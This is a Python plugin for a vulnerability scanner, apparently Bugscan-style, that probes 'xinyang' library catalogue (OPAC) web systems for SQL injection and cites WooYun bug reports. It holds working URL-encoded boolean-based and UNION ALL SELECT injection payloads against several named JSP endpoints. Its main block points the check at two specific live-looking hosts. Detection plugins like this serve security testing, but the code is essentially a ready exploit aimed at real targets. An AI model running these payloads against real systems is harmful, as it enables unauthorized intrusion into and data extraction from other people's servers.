#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-085319
#refer:http://www.wooyun.org/bugs/wooyun-2010-082667
#refer:http://www.wooyun.org/bugs/wooyun-2010-079840
#refer:http://www.wooyun.org/bugs/wooyun-2010-014662

import re

def assign(service, arg):
    if service == "xinyang":
        return True, arg
        
        
def audit(arg): 
    payloads = [
        'opac/hot.jsp?flh=',
        'opac/index_hotll.jsp?flh=',
        'opac/fljs/fllist.jsp?flh=',
        'opac/ckgc.jsp?kzh=',
        
        ]
    getdata1 = '%25%27%20AND%201%3D1%20AND%20%27%25%27%3D%27'
    getdata2 = '%25%27%20AND%201%3D2%20AND%20%27%25%27%3D%27'
    for payload in payloads:
        url1 = arg + payload +getdata1
        url2 = arg + payload + getdata2
        code1, head, res1, errcode, _ = curl.curl2(url1)
        code2, head, res2, errcode, _ = curl.curl2(url2)  
        m1 = re.findall('href',res1)
        m2 = re.findall('href',res2)
        if code1 == 200 and code2 ==200 and m1!=m2:
            security_hole(arg+payload+'   :found sql Injection')
            
            
    payload = 'ggjs/dzxx/dzxmjsajax.jsp?nameparm=1'
    getdata = '%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2885%29%7C%7CCHR%28122%29%7C%7CCHR%28101%29%7C%7CCHR%2899%29%7C%7CCHR%28114%29%7C%7CCHR%28120%29%7C%7CCHR%2871%29%7C%7CCHR%2875%29%7C%7CCHR%2870%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%20FROM%20DUAL--'
    url = arg + payload + getdata
    code, head ,res, errcode, _ = curl.curl2(url)
    if 'qvzbqxUzecrxGKFqjxkq' in res :
        security_hole(arg+payload+'   :found sql Injection')
        


if __name__ == '__main__':
    from dummy import *
    audit(assign('xinyang','http://tsjs.sdwm.cn:8000/')[1])
    audit(assign('xinyang','http://59.51.114.198:8088/')[1])